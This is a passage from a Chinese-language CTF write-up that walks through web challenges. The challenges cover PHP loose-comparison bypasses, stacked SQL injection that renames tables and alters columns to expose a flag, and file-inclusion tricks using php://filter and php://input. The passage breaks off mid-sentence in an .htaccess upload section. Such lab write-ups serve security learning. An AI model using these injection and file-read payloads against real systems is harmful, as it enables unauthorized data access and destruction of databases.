src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp4.jpg"></p><p>继续阅读代码，发现有c作为值，试着绕过c，首先有一个json_decode(@$_GET[‘c’])，说明要c是post，json格式的数据，提交形式c&#x3D;{}，首先有一个m，m&gt;2022&amp;&amp;m不是数字，那么我们想到PHP中的松散比较，m不是数字，那么必然是字符串，<strong>字符串于数值比较时，如果包含数字，则尝试先转为只保留数字，如果不包含数字，则转为0，</strong>所以我们这里会有c&#x3D;{“m”:20222a}，m已经通过，向下走，发现c中还有一个变量n，首先n是一个数组，然后count()&#x3D;2，说明其有两个元素。</p><p>那么修改c的形式c&#x3D;{“m”:”20222a”,”n”:[]}，可以发现出现了no hack字样，说明我们已经绕过了m的验证，然后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>][<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><p>说明n的第一个元素要为数组，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;DGGJ&quot;</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]);<br><span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no...&quot;</span>):<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>    <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;DGGJ&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no......&quot;</span>):<span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这里是说明n中要包含DGGJ，又不能包含DGGJ，很神奇，这里要解决的话，我们应该想到PHP中比较常见的比较陷阱，array_search的本质是将需要查找的字符串与数组内的元素进行比较，所以我们写0的话是不是就可以绕过这个查询了呢（0在比较中的特殊性），我们可以这样写了c&#x3D;{“m”:”22222a”,”m”:[[0,1],0]}，然后try一下，答案来了。</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp5.jpg"></p><h4 id="3-SuperSQLi"><a href="#3-SuperSQLi" class="headerlink" title="3_SuperSQLi"></a>3_SuperSQLi</h4><h5 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h5><p>进入环境后出现一个查询框，如下图</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp6.jpg"></p><p>题目已经告诉了这是一道sql注入题，所以直接使用sql注入解题。</p><h5 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;<strong>：Stacked injections(堆叠注入)从名词的含义就可以看到应该是</strong>一堆 sql 语句(多条)一起执行</strong>。在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句。因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间在于<strong>union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</strong>但是堆叠查询并不是每个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>一般的拼接形式为: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show .....</span><br><span class="hljs-string">=1&#x27;</span>;<span class="hljs-keyword">drop</span> .....<br><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename ...</span><br></code></pre></td></tr></table></figure></li><li><p><strong>SQL的一些表相关的DDL语句知识：</strong></p><ul><li><pre><code class="sql">show tables; #打印当前所有表<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```sql<br>  show columns from `tablename`;#展示指定表的所有字段<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="sql">alter table `ss` rename to `S`;-- 修改表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-operator">-</span> ```<span class="hljs-keyword">sql</span><br>  <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `S` change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">-- 修改表中字段名和字段类型  </span><br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h5 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h5><p>首先，使用常用的SQL注入测试，注入’or 1&#x3D;1，出现了新的回显，就是输入不同的id返回的值，并且只有1，2，114514有不同的返回值，但好像暂时并没有什么用。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp8.jpg"></p><p>然后使用union联查，**’union select * from supersqli;当然是测试题目名构成的表啦，说不定就中了呢。**当然这里没中，回显表明后端进行了一定的过滤。像select、update都被ban掉了，但是show没有被ban掉，可以尝试打印。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp9.jpg"></p><p><strong>我们show一下databases，发现出现了回显，显示了当前DBMS中管理的数据库</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp10.jpg"></p><p>发现了supersqli，合理推测这是题目使用的数据库，我们继续查看一下包含的表，<strong>show tables</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp11.jpg"></p><p>发现当前使用的有两张表，1919810931114514和words，show columns from打印两张表的字段看看。</p><p>words表里的内容如下图，<strong>包含id和data，非常有可能是题目查询使用的表，因为我们输入的是id的值，返回给我们data的内容</strong></p><p>使用的注入语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;;show columns from `word`</span><br><span class="hljs-string">--注意字符串作为表名使用时应该带有反引号`</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp12.jpg"></p><p><strong>1919810931114514表里的内容，包含flag，这应该就是我们需要的东西了，问题现在转到了如何让题目查询1919…这张表。</strong></p><p>使用的注入语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp13.jpg"></p><p><strong>我们这里采用修改表名的方式修改查询对象，</strong></p><p><strong>1’;alter table words rename to word;</strong></p><p><strong>没有报错，我们再次查询一下发现，已经找不到原来的表了，也验证了前面猜测这是题目所用的那张表。</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp15.jpg"></p><p>**&#x3D;&#x3D;但是这里出现了一个问题，当我们像修改另一张表的名字时，同样也会报错，为什么呢，因为现在已经找不到words表了，id字段不能被注入了，所以我们应该同时修改两张表，而且同时要修改新的words表的flag字段为id&#x3D;&#x3D;**，也就是这样写：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;alter table `words` rename to `word`;alter table `1919810931114514` rename to `words`;alter table words change flag id varchar(100);</span><br></code></pre></td></tr></table></figure><p>那么我们再用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or 1=1;</span><br></code></pre></td></tr></table></figure><p>即可得到答案。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp16.jpg"></p><h4 id="4-CTF-fileinclude-1"><a href="#4-CTF-fileinclude-1" class="headerlink" title="4_CTF_fileinclude_1"></a>4_CTF_fileinclude_1</h4><h5 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h5><p>进入环境直接一段PHP代码，且是文件上传相关，先去学习一下PHP文件上传相关知识。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">WRONG WAY! <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file1&quot;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file2&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file1&quot;</span>];<br>    <span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file2&quot;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file1</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file2</span>))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file2</span>) === <span class="hljs-string">&quot;hello ctf&quot;</span>)<br>        &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>**&#x3D;&#x3D;PHP伪协议&#x3D;&#x3D;**：参考文章<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><ul><li><p><strong>php:&#x2F;&#x2F;协议</strong>，访问各个IO流，CTF中常用php:&#x2F;&#x2F;filter（用于读取源码）和php:&#x2F;&#x2F;input（执行php代码）</p></li><li><p><strong>php:&#x2F;&#x2F;filer，</strong>(&gt;&#x3D;5.0.0)一种元封装器，设计<strong>用于数据流打开时的筛选过滤</strong>应用。对于一体式<code>（all-in-one）</code>的<strong>文件函数非常有用</strong>，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</p><ul><li>resource参数：传入要过滤的数据流</li><li>read参数：可选，可以设定多个过滤器名称</li><li>write参数：可选，可以设定多个过滤器名称</li><li>一个样例：test&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;info.php</li></ul></li><li><p><strong>php:&#x2F;&#x2F;input</strong>，假如我们post了一个data，则使用input可以读取这个data，所以在url请求头中可以使用input进行传参。同时，可以post一段php代码，让input去执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">..../?id=1&amp;&amp;name=php://input<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>PHP include&#x2F;require函数：</strong>如果 include&#x2F;require 出现于调用文件中的一个函数里，则<strong>被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样</strong>。所以它将遵循该函数的变量范围。此规则的一个例外是魔术常量，它们是在发生包含之前就已被解析器处理的。include在所包含文件找不到时会继续执行之后的代码，而require会报错。</p></li><li><p><strong>Base64编码流程：base64常以&#x3D;号结尾</strong></p><ul><li>1.将所有字符转为8位二进制的ASCII码</li><li>2.将8位二进制3个归为一组，共计24位，再拆分为4组，每组6位（$2^6&#x3D;64$）</li><li>3.将获得的6位二进制转为10进制</li><li>4.从Base64编码表获取对应的编码</li><li><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_1.jpg"></li></ul></li><li><p><strong>对于不足6位的补零（图中浅红色的4位），索引为“A”；对于最后不足3字节，进行补零处理（图中红色部分），以“&#x3D;”替代，因此，“ABCD”的base64编码为：“QUJDRA&#x3D;&#x3D;”。</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_2.jpg"></p></li></ul><h5 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h5><p>代码有一句include(“flag.php”)，引入了一个文件，我们合理地猜测flag是包含在flag.php中的，所以我们先访问一下flag.php，发现只打印了一句，并没有flag，说明flag可能在文件的注释里。然后有两个参数，说明我们需要在url中传入file1和file2两个参数。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_5.jpg"></p><p>于是我们合理地想到可以使用文件过滤，将flag.php中地源码提取出来，原因是在第二层的if语句中有</p><p><code>include($file1);</code>，于是我们的url中file1可以这样编写：<code>file1=php://filter/read=convert.base64-encode/resource=flag.php</code>；然后考虑file2，我们先使用hackbar尝试一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=hello ctf<br></code></pre></td></tr></table></figure><p>发现报错，因为<strong>有个file_get_contents函数，file2输入得是个文件才行</strong>，但是现在我们没有其他的文件可以输入。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_6.jpg"></p><p>在hackbar里提交如下url，且在post中提交hello ctf，这里hackbar提交不了，选择使用BP提交，先在hackbar里execute，然后再BP里抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=php://input<br></code></pre></td></tr></table></figure><p>如下，<strong>注意修改content-length</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_3.jpg"></p><p>得到一个base64编码，然后去解码即可</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_4.jpg"></p><h4 id="5-file-include-江苏工匠杯（-字符编码问题未懂）"><a href="#5-file-include-江苏工匠杯（-字符编码问题未懂）" class="headerlink" title="5_file_include 江苏工匠杯（?字符编码问题未懂）"></a>5_file_include 江苏工匠杯（?字符编码问题未懂）</h4><h5 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h5><p>进入环境，看到一段PHP代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./check.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h5><ul><li><strong>PHP——iconv函数</strong></li><li>一些常见的字符编码</li></ul><h5 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h5><p>很明显的是文件包含问题，读代码我们可以发现是要在url中输入一个filename变量。</p><p>首先尝试了一下伪协议，<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p><p>结果出现了，但是只有一句话。resource改成其他都是相同的回显。说明很可能被过滤，但具体过滤了哪些东西还不清楚</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/file_include_jiangsugongjiangbei_1.jpg"></p><p>可以使用<code>convert.iconv.</code>，进行过滤，可以使用convert.iconv.utf8.utf16&#x2F;resource&#x3D;check.php</p><h4 id="6-fileinclude-宜兴网信办"><a href="#6-fileinclude-宜兴网信办" class="headerlink" title="6_fileinclude 宜兴网信办"></a>6_fileinclude 宜兴网信办</h4><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_1.jpg"></p><p>文件包含题。</p><h5 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>cookie</strong>：</p></li><li><p>BP中cookie的写法</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">cookie</span><span class="hljs-punctuation">: </span>language=flag<br></code></pre></td></tr></table></figure></li></ul><h5 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h5><p>首先检查下网页源代码，发现出现了index.php的源码。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;/head&gt;<br><br>&lt;br /&gt;<br>&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: language in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;9&lt;/b&gt;&lt;br /&gt;<br>Please choose the language you want : English or Chinese<br>&lt;h1&gt;Hi,EveryOne,The flag is in flag.php&lt;/h1&gt;&lt;html&gt;<br>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;/head&gt;<br><br>&lt;?php<br>if( !ini_get(&#x27;display_errors&#x27;) ) &#123;<br>  ini_set(&#x27;display_errors&#x27;, &#x27;On&#x27;);<br>  &#125;<br>error_reporting(E_ALL);<br>$lan = $_COOKIE[&#x27;language&#x27;];<br>if(!$lan)<br>&#123;<br>@setcookie(&quot;language&quot;,&quot;english&quot;);<br>@include(&quot;english.php&quot;);<br>&#125;<br>else<br>&#123;<br>@include($lan.&quot;.php&quot;);<br>&#125;<br>$x=file_get_contents(&#x27;index.php&#x27;);<br>echo $x;<br>?&gt;<br>&lt;/html&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>发现是要我们传入一个cookie，其name为language，题目告诉我们答案在flag.php里，那么我们就去那里看看。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_yixin_2.jpg"></p><p>设置一下cookie，加上过滤，所以我们这样写</p><p><code>language=php://filter/read=convert.base64-encode/resource=flag</code></p><p>发现直接给出了一段base64编码后的字符串，去转换一下，得出答案。</p><h4 id="7-easy-upload-CTF"><a href="#7-easy-upload-CTF" class="headerlink" title="7_easy_upload_CTF"></a>7_easy_upload_CTF</h4><h5 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h5><p>进入环境，就是一个文件上传的提交</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/easy_upload_CTF_1.jpg"></p><p>检查一下网页源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.round_icon</span>&#123;</span><br><span class="language-css">  <span class="hljs-attribute">width</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">height</span>: <span class="hljs-number">88px</span>;</span><br><span class="language-css">  <span class="hljs-attribute">display</span>: flex;</span><br><span class="language-css">  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><br><span class="language-css">  <span class="hljs-attribute">align-items</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">justify-content</span>: center;</span><br><span class="language-css">  <span class="hljs-attribute">overflow</span>: hidden;</span><br><span class="language-css">  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">&#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>easyupload<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">background</span>=<span class="hljs-string">&quot;background.jpg&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-size:cover&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;uploads/index.php&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;round_icon&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;middle&quot;</span>  <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: blue;&quot;</span>&gt;</span>更换头像<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fileUpload&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: blue;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>**&#x3D;&#x3D;.htaccess文件&#x3D;&#x3D;**：<code>.htaccess</code> 由于它以点或点开头，因此通常称为“点文件”。 <strong>点文件几乎总是某种形式的配置文件</strong>。 点文件可以用于操作系统或软件。 默认情况下，操作系统会将点文件隐藏在查找程序窗口或任何类型的系统文件管理器中。 通常，您必须从操作系统的首选项中选择“显示隐藏的文件”选项。 或者您可以使用 <code>ls -a</code> 命令以在命令行上显示所有文件。</p><p>​        全称是Hypertext Access(超文本入口)。<strong>提供了针对目录改变配置的方法</strong>， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 